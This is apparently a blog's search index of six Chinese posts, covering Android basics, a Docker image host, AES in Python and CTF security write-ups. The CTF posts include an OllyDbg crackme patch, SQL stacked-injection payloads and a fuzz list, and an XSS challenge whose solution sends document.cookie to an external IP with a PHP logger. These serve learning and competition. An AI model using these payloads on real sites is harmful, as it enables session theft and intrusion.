<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>从零开始android开发(一)</title>
    <link href="/newblog/2020/03/17/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bandroid%E5%BC%80%E5%8F%91-%E4%B8%80/"/>
    <url>/newblog/2020/03/17/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bandroid%E5%BC%80%E5%8F%91-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<p>因为某些原因，打算学习安卓开发，记录一下每一步。</p><h1 id="Bottom-Navigation-Activity"><a href="#Bottom-Navigation-Activity" class="headerlink" title="Bottom Navigation Activity"></a>Bottom Navigation Activity</h1><p>首先开发工具是as3，新建一个bottom navigation activity，因为底部导航栏是比较常用的嘛，这里就直接建一个项目。</p><h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><h3 id="androidmainfest-xml"><a href="#androidmainfest-xml" class="headerlink" title="androidmainfest.xml"></a>androidmainfest.xml</h3><p>这个是android的主配置文件，采用XML描述语言。<br>AndroidManifest.xml配置文件的根元素，必须包含一个<application>元素并且指定xlmns:android和package属性。xlmns:android指定了Android的命名空间，默认情况下是“<a href="http://schemas.android.com/apk/res/android”；而package是标准的应用包名，也是一个应用进程的默认名称。" target="_blank" rel="noopener">http://schemas.android.com/apk/res/android”；而package是标准的应用包名，也是一个应用进程的默认名称。</a><br>android:versionCode是给设备程序识别版本用的，必须是一个整数值代表app更新过多少次；而android:versionName则是给用户查看版本用的，需要具备一定的可读性，比如“1.0.0”这样的。<br>下面是一份官方的AndroidManifest.xml，格式是这样，具体解析就不赘述了。</application></p><pre><code class="xml">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;          package=&quot;com.sample.teapot&quot;          android:versionCode=&quot;1&quot;          android:versionName=&quot;1.0.0.1&quot; &gt;  &lt;uses-feature android:glEsVersion=&quot;0x00020000&quot;&gt;&lt;/uses-feature&gt;  &lt;application      android:allowBackup=&quot;false&quot;      android:fullBackupContent=&quot;false&quot;      android:supportsRtl=&quot;true&quot;      android:icon=&quot;@mipmap/ic_launcher&quot;      android:label=&quot;@string/app_name&quot;      android:theme=&quot;@style/AppTheme&quot;      android:name=&quot;com.sample.teapot.TeapotApplication&quot;      &gt;    &lt;!-- Our activity is the built-in NativeActivity framework class.         This will take care of integrating with our NDK code. --&gt;    &lt;activity android:name=&quot;com.sample.teapot.TeapotNativeActivity&quot;              android:label=&quot;@string/app_name&quot;              android:configChanges=&quot;orientation|keyboardHidden&quot;&gt;      &lt;!-- Tell NativeActivity the name of our .so --&gt;      &lt;meta-data android:name=&quot;android.app.lib_name&quot;                 android:value=&quot;TeapotNativeActivity&quot; /&gt;      &lt;intent-filter&gt;        &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;        &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;      &lt;/intent-filter&gt;    &lt;/activity&gt;  &lt;/application&gt;&lt;/manifest&gt;</code></pre><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p>java文件夹里有dashboard,home,notifications三个文件夹和一个MainActivity.三个文件夹分别是对应的底部三个导航栏。每个文件夹下有两个文件，一个是用来承载控件的fragment，另一个是与之对应的viewModel。fragment用来显示ui界面，而viewmodel则是给ui界面提供数据，view里的每一个控件在viewmodel里都有一个对应的数据对象，如果要更新view上的ui界面，只需要更新viewmodel里与之对应的对象即可。</p><h3 id="res"><a href="#res" class="headerlink" title="res"></a>res</h3><h4 id="menu"><a href="#menu" class="headerlink" title="menu"></a>menu</h4><p>menu文件夹下的bottom_nav_menu.xml操控底部导航栏图标。</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;menu xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;    &lt;item        android:id=&quot;@+id/navigation_home&quot;        android:icon=&quot;@drawable/ic_home_black_24dp&quot;        android:title=&quot;@string/title_home&quot; /&gt;    &lt;item        android:id=&quot;@+id/navigation_dashboard&quot;        android:icon=&quot;@drawable/ic_dashboard_black_24dp&quot;        android:title=&quot;@string/title_dashboard&quot; /&gt;    &lt;item        android:id=&quot;@+id/navigation_notifications&quot;        android:icon=&quot;@drawable/ic_notifications_black_24dp&quot;        android:title=&quot;@string/title_notifications&quot; /&gt;    &lt;item        android:id=&quot;@+id/navigation_me&quot;        android:icon=&quot;@drawable/ic_notifications_black_24dp&quot;        android:title=&quot;@string/title_me&quot; /&gt;&lt;/menu&gt;</code></pre><p>这里我可以自定义一个底部item，这里的@string/title_home是在res-&gt;values-&gt;strings.xml里定义。然后在java-&gt;ui文件夹下新建一个me的Package，在Package里右键new-&gt;Fragment-&gt;Fragment(with ViewMoudle)。<br>然后修改MainActivity里的代码。</p><pre><code class="java">AppBarConfiguration appBarConfiguration = new AppBarConfiguration.Builder(                R.id.navigation_home, R.id.navigation_dashboard, R.id.navigation_notifications,R.id.navigation_me)                .build();</code></pre><h4 id="layout"><a href="#layout" class="headerlink" title="layout"></a>layout</h4><p>layout下是每一个的布局文件。</p><h4 id="navigation"><a href="#navigation" class="headerlink" title="navigation"></a>navigation</h4><p>相应修改此处的mobile_navigation.xml.</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;navigation xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;    xmlns:tools=&quot;http://schemas.android.com/tools&quot;    android:id=&quot;@+id/mobile_navigation&quot;    app:startDestination=&quot;@+id/navigation_home&quot;&gt; //默认启动页    &lt;fragment        android:id=&quot;@+id/navigation_home&quot;        android:name=&quot;com.chenxiyuan.youbang.ui.home.HomeFragment&quot;        android:label=&quot;@string/title_home&quot;        tools:layout=&quot;@layout/fragment_home&quot; /&gt;    &lt;fragment        android:id=&quot;@+id/navigation_dashboard&quot;        android:name=&quot;com.chenxiyuan.youbang.ui.dashboard.DashboardFragment&quot;        android:label=&quot;@string/title_dashboard&quot;        tools:layout=&quot;@layout/fragment_dashboard&quot; /&gt;    &lt;fragment        android:id=&quot;@+id/navigation_notifications&quot;        android:name=&quot;com.chenxiyuan.youbang.ui.notifications.NotificationsFragment&quot;        android:label=&quot;@string/title_notifications&quot;        tools:layout=&quot;@layout/fragment_notifications&quot; /&gt;    &lt;fragment        android:id=&quot;@+id/navigation_me&quot;        android:name=&quot;com.chenxiyuan.youbang.ui.me.MeFragment&quot;        android:label=&quot;@string/title_me&quot;        tools:layout=&quot;@layout/me_fragment&quot; /&gt;&lt;/navigation&gt;</code></pre><h2 id="webview组件"><a href="#webview组件" class="headerlink" title="webview组件"></a>webview组件</h2><p>先简单用一下webview组件。<br>在mainfest里添加网络权限</p><pre><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;</code></pre><p>在layout里对应的布局文件里，Palette-&gt;Widgets-&gt;Webview,添加组件。</p><pre><code class="xml">&lt;WebView        android:id=&quot;@+id/webview&quot;        android:layout_width=&quot;match_parent&quot;        android:layout_height=&quot;match_parent&quot; /&gt;</code></pre><p>这里我直接在HomeFragment里调用webview.</p><pre><code class="java">public class HomeFragment extends Fragment {    private HomeViewModel homeViewModel;    public View onCreateView(@NonNull LayoutInflater inflater,                             ViewGroup container, Bundle savedInstanceState) {        homeViewModel =                ViewModelProviders.of(this).get(HomeViewModel.class);        View root = inflater.inflate(R.layout.fragment_home, container, false);        WebView myWebView = (WebView) root.findViewById(R.id.webview);        myWebView.loadUrl(&quot;http://www.baidu.com&quot;);        return root;    }}</code></pre><p>刚开始报错，在网上搜了一下，解决方法是在manifest中application节点添加:</p><pre><code>android:usesCleartextTraffic=&quot;true&quot;</code></pre><p>然后运行虚拟机，成功访问网页。</p>]]></content>
    
    
    <categories>
      
      <category>安卓开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ollydbg破解crackme001</title>
    <link href="/newblog/2020/03/16/Ollydbg%E7%A0%B4%E8%A7%A3crackme001/"/>
    <url>/newblog/2020/03/16/Ollydbg%E7%A0%B4%E8%A7%A3crackme001/</url>
    
    <content type="html"><![CDATA[<p>逆向我也只是个初学者，之前博客有记录IDA的一些使用，这次来爆破一个简单的crackme。<br>首先Ollydbg打开,看看基本逻辑。<br><img src="http://120.26.91.51:4001/uploads/big/a13e20f5af09bedfd90513890af96a8b.png" srcset="/newblog/img/loading.gif" alt="ollydbg_001"><br>可以看到输入出错后消息框里有Try again!!字符串，就从这里入手了。<br>右键中文搜索引擎-&gt;智能搜索，搜索Try<br><img src="http://120.26.91.51:4001/uploads/big/c202ac3f4f627645aa109bcea61d5b74.png" srcset="/newblog/img/loading.gif" alt="ollydbg_002"><br>分别点开这两块，来看看汇编的代码。<br><img src="http://120.26.91.51:4001/uploads/big/2e57ac013c74e65f70f4f0237229e183.png" srcset="/newblog/img/loading.gif" alt="ollydbg_003"><br>这里看到上面有一句jnz，查一下发现<code>JNZ : jump if not zero 结果不为零则转移</code>，那么这里填充NOP不让它跳转到Try again，就成功执行下去，爆破成功，下面一个同理。<br><img src="http://120.26.91.51:4001/uploads/big/bf8996de3353a03dee37886f9c3e1e20.png" srcset="/newblog/img/loading.gif" alt="ollydbg_004"><br>爆破成功。接下来保存右键-&gt;复制到可执行文件-&gt;所有修改-&gt;全部复制，然后跳转到.exe窗口，在这个窗口里右键-&gt;保存文件即可。</p>]]></content>
    
    
    <categories>
      
      <category>re</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Ollydbg</tag>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SUCTF2019 EasySQL记录</title>
    <link href="/newblog/2020/03/16/SUCTF2019-EasySQL%E8%AE%B0%E5%BD%95/"/>
    <url>/newblog/2020/03/16/SUCTF2019-EasySQL%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>先打开测试一下，有三种，分别是array，nonono，无回显。可以堆叠注入</p><pre><code>1;show databases;1;show tables;</code></pre><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>fuzz,这里贴上一些关键字</p><pre><code>length +handlerlikeselect sleepdatabasedeletehavingoras-~BENCHMARKlimitleftselectinsertright#--+INFORMATION--;!%+xor&lt;&gt;(&gt;&lt;).^=ANDBYCASTCOLUMNCOUNTCREATEENDcase&#39;1&#39;=&#39;1whenadmin&#39;&quot;length +lengthREVERSEasciiselect databaseleftrightunion&quot;&amp;&amp;&amp;||oorr/////**/*/**/ananddGROUPHAVINGIFINTOJOINLEAVELEFTLEVELsleepLIKENAMESNEXTNULLOFON|infromation_schemauserORORDERORDSCHEMASELECTSETTABLETHENUNIONUPDATEUSERUSINGVALUEVALUESWHENWHEREADDANDpreparesetupdatedeletedropinsetCASTCOLUMNCONCATGROUP_CONCATgroup_concatCREATEDATABASEDATABASESalterDELETEDROPfloorrand()information_schema.tablesTABLE_SCHEMA%dfconcat_ws()concatLIMITORDONextractvalueorder CAST()byORDEROUTFILERENAMEREPLACESCHEMASELECTSETupdatexmlSHOWSQLTABLETHENTRUEinstrbenchmarkformatbinsubstringordUPDATEVALUESVARCHARVERSIONWHENWHERE/*`,users%0a%0bmidforBEFOREREGEXPRLIKEinsys schemmaSEPARATORXORCURSORFLOORsys.schema_table_statistics_with_bufferINFILEcount%0cfrom%0d%a0=@else</code></pre><p>这里插一句，如果bp代理监听器勾选不上的话，可能是端口占用。先查找端口占用的进程<code>netstat -ano | findstr 8080</code>，再把这个进程关掉就好了。</p><h2 id="sql-mode"><a href="#sql-mode" class="headerlink" title="sql_mode"></a>sql_mode</h2><p>sql_mode定义了MySQL应支持的SQL语法，以及应该在数据上执行何种确认检查，其中的<code>PIPES_AS_CONCAT</code>将<code>||</code>视为字符串的连接操作符而非 “或” 运算符。<br><img src="http://120.26.91.51:4001/uploads/big/1020ec590df5cd332773b760656b94e2.png" srcset="/newblog/img/loading.gif" alt="sql_mode"><br>这个模式下拼接字母会出错，只能拼接数字。</p><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>这是一个堆叠注入</p><pre><code>payload:1;set sql_mode=pipes_as_concat;select 1</code></pre><p>源码里的语句是<code>select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag</code>,现在就能够理解了。</p><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p><code>payload</code>:<code>*,1</code><br>拼接一下:<code>select *,1||flag from Flag</code>等同于<code>select *,1 from Flag</code></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>注入</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker+Lychee搭建自己的图床</title>
    <link href="/newblog/2020/03/16/docker-Lychee%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/"/>
    <url>/newblog/2020/03/16/docker-Lychee%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84%E5%9B%BE%E5%BA%8A/</url>
    
    <content type="html"><![CDATA[<p>之前的图床过期，图片直接没了，所以现在在自己服务器上搭一个小型图床好了。用的是开源项目Lychee。</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p>docker安装就不记录了，之前博客写过。</p><h2 id="Lychee"><a href="#Lychee" class="headerlink" title="Lychee"></a>Lychee</h2><p>拉取镜像</p><pre><code>docker image pull kdelfour/lychee-docker</code></pre><p>运行镜像</p><pre><code>docker run -it -d -p 4001:80 kdelfour/lychee-docker</code></pre><p>然后访问<code>服务器ip:4001</code>,进行简单的设置，就可以上传图片了。</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>图床</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次ctf校赛simple_xss出题</title>
    <link href="/newblog/2020/03/15/%E8%AE%B0%E4%B8%80%E6%AC%A1ctf%E6%A0%A1%E8%B5%9Bsimple-xss%E5%87%BA%E9%A2%98/"/>
    <url>/newblog/2020/03/15/%E8%AE%B0%E4%B8%80%E6%AC%A1ctf%E6%A0%A1%E8%B5%9Bsimple-xss%E5%87%BA%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="记ctf校赛simple-xss出题"><a href="#记ctf校赛simple-xss出题" class="headerlink" title="记ctf校赛simple_xss出题"></a>记ctf校赛simple_xss出题</h1><p>这篇文章也拖了半年才发，主要是硬盘坏了，原本的博客文件丢失，新搭了子博客，可以发出来了。</p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>跨站脚本攻击（XSS），是目前最普遍的Web应用安全漏洞。这类漏洞能够使得攻击者嵌入恶意脚本代码到正常用户会访问到的页面中，当正常用户访问该页面时，则可导致嵌入的恶意脚本代码的执行，从而达到恶意攻击用户的目的。</p><h3 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h3><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射型XSS也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行。从概念上可以看出，反射型XSS代码是首先出现在URL中的，然后需要服务端解析，最后需要浏览器解析之后XSS代码才能够攻击。</p><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>存储型XSS也叫持久型XSS，主要是将XSS代码发送到服务器（不管是数据库、内存还是文件系统等。），然后在下次请求页面的时候就不用带上XSS代码了。最典型的就是留言板XSS。用户提交了一条包含XSS代码的留言到数据库。当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来。浏览器发现有XSS代码，就当做正常的HTML和JS解析执行。XSS攻击就发生了。<br>一般用在如下地方:</p><ol><li>窃取用户信息，如cookie，token，账号密码等。</li><li>劫持流量实现恶意跳转</li></ol><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>DOM型XSS：不经过后端，DOM-XSS漏洞是基于文档对象模型(Document Objeet Model,DOM)的一种漏洞，DOM-XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。</p><h3 id="XSS攻击载荷"><a href="#XSS攻击载荷" class="headerlink" title="XSS攻击载荷"></a>XSS攻击载荷</h3><p>以下所有标签的<code>&gt;</code>都可以用<code>//</code>代替，例如 <code>&lt;script&gt;alert(1)&lt;/script//</code></p><h4 id="script标签"><a href="#script标签" class="headerlink" title="script标签"></a>script标签</h4><pre><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;       &lt;script&gt;alert(document.cookie)&lt;/script&gt;      #弹出cookie&lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;  #引用外部的xss</code></pre><h4 id="svg标签"><a href="#svg标签" class="headerlink" title="svg标签"></a>svg标签</h4><pre><code>&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;svg onload=&quot;alert(1)&quot;//</code></pre><h4 id="img标签"><a href="#img标签" class="headerlink" title="img标签"></a>img标签</h4><pre><code>&lt;img  src=1  οnerrοr=alert(&quot;xss&quot;)&gt;&lt;img  src=1  οnerrοr=alert(document.cookie)&gt;  #弹出cookie</code></pre><h4 id="body标签"><a href="#body标签" class="headerlink" title="body标签"></a>body标签</h4><pre><code>&lt;body οnlοad=alert(1)&gt;&lt;body οnpageshοw=alert(1)&gt;</code></pre><h2 id="xss-bot"><a href="#xss-bot" class="headerlink" title="xss_bot"></a>xss_bot</h2><p>xss bot就是代替管理员去完成点击页面的任务，bot需要能够执行js，事情的本质是我们需要一个浏览器内核来解析js.xss bot一般会用selenium+webdriver</p><h3 id="selenium"><a href="#selenium" class="headerlink" title="selenium"></a>selenium</h3><p>selenium是用来控制webdriver的接口的.</p><p>Selenium测试直接运行在浏览器中，就像真正的用户在操作一样。支持的浏览器包括IE（7, 8, 9, 10, 11），Firefox，Safari，Chrome，Opera等。</p><p>使用python爬虫调用selenium来模拟正常用户访问浏览器.<br>最新版selenium已经放弃PhantomJS了，selenium版本降级安装</p><pre><code>pip install selenium==2.48.0</code></pre><h3 id="phantomjs"><a href="#phantomjs" class="headerlink" title="phantomjs"></a>phantomjs</h3><p>chrome和firefox的webdriver都有一个特点，就是需要桌面,我们搭建题目在docker环境中会有问题，<br>phantomjs和别的浏览器本质上没什么区别，差不多也是类似于浏览器的内核，优势其实是多平台支持无图形化，而且不需要浏览器支持。</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>第一种方式</p><pre><code>apt-get install phantomjs需要加但是因为这样安装的不全，再python执行的时候，会报跟json编码有关的错。sudo apt-get install nodejssudo apt-get install nodejs-legacysudo apt-get install npmsudo npm -g install phantomjs-prebuilt  可以这样安装一个完整的环境</code></pre><p>第二种方式：</p><pre><code>wget http://npm.taobao.org/mirrors/phantomjs/phantomjs-2.1.1-linux-x86_64.tar.bz2tar xvjf phantomjs-2.1.1-linux-x86_64.tar.bz2sudo cp phantomjs-2.1.1-linux-x86_64/bin/phantomjs /usr/bin/</code></pre><h3 id="代码部分"><a href="#代码部分" class="headerlink" title="代码部分"></a>代码部分</h3><pre><code class="python">from selenium import webdriverimport time#要想调用键盘按键,鼠标操作需要引入keys包from selenium.webdriver.common.keys import Keys#创建PhantomJS浏览器对象driver = webdriver.PhantomJS()#driver = webdriver.PhantomJS(&#39;/usr/bin/phantomjs&#39;)#加载网站页面driver.get(&quot;http://127.0.0.1:5000/login.html&quot;)#找到页面input输入标签并填充文本内容admindriver.find_element_by_id(&#39;username&#39;).send_keys(&quot;admin&quot;)driver.find_element_by_id(&#39;password&#39;).send_keys(&quot;123456&quot;)  #输入帐号密码登录网站#By Name 找到name=login的按钮并模拟点击data = driver.find_element_by_name(&#39;login&#39;).click()time.sleep(1)#管理员登录状态访问存在xss的页面driver.get(&quot;http://127.0.0.1:5000/home.php&quot;)driver.quit()   </code></pre><h2 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h2><p>简单的xss，没有任何过滤，不过实际测试时双引号会被过滤，在留言处插入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>弹窗成功，接下来就是打admin的cookie，可以选择xss平台也可以自己写，这里贴上cchan的payload供大家参考.</p><pre><code class="html">&lt;script src=//xxx.xx.xxx.xxx/cookie.js&gt;&lt;/script&gt;</code></pre><pre><code class="js">var xhr = new XMLHttpRequest();xhr.open(&#39;GET&#39;, &#39;http://106.15.194.242/cookie.php?&#39; + document.cookie);xhr.send();</code></pre><pre><code class="php">&lt;?phpheader(&#39;Access-Control-Allow-Origin: *&#39;);file_put_contents(&#39;cookie.txt&#39;, $_SERVER[&#39;QUERY_STRING&#39;].&quot;\n&quot;, FILE_APPEND);</code></pre><p>出题时没考虑到搅屎，admin被插入跳转后，后面的就渲染不出来了，不得不重置数据库。还有一点是为了区分用户和admin bot，我写了$_SERVER[‘HTTP_REFERER’]，有跳转的视为正常用户进入home.php,无跳转且cookie为admin就直接输出flag,所以如果大家直接进入admin的界面，需要把referer清空。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python3 aes实现</title>
    <link href="/newblog/2020/03/03/python3-aes%E5%AE%9E%E7%8E%B0/"/>
    <url>/newblog/2020/03/03/python3-aes%E5%AE%9E%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>python-3.6.5</p><pre><code>pip install pycryptodome#Python36\Lib\site-packages\crypto =&gt;Python36\Lib\site-packages\Crypto  不更改导入包会报错</code></pre><h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><pre><code class="python">from Crypto.Cipher import AESimport base64def add_to_16(par):    par = par.encode(&#39;gbk&#39;) #先将字符串类型数据转换成字节型数据    while len(par) % 16 != 0: #对字节型数据进行长度判断        par += b&#39;\x00&#39; #如果字节型数据长度不是16倍整数就进行 补充    return pardef encrypt(text,key):    mode = AES.MODE_ECB    aes = AES.new(add_to_16(key), mode)    cipher = aes.encrypt(add_to_16(text))    return base64.encodebytes(cipher).decode().strip()def decrypt(text,key):    mode = AES.MODE_ECB    text = base64.decodebytes(text.encode(&#39;gbk&#39;))    aes = AES.new(add_to_16(key), mode)    plaintext = aes.decrypt(text)    return plaintext.decode(&#39;gbk&#39;).strip(&#39;\0&#39;)if __name__ == &#39;__main__&#39;:    e = encrypt(&quot;晨曦远&quot;,&quot;123456&quot;)    print(&quot;加密:&quot;, e)    d=decrypt(e,&quot;123456&quot;)    print(&quot;解密:&quot;,d)</code></pre><p>去在线网站加解密试试<a href="http://tool.chacuo.net/cryptaes" target="_blank" rel="noopener">在线aes加密解密</a></p>]]></content>
    
    
    <categories>
      
      <category>crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>aes</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
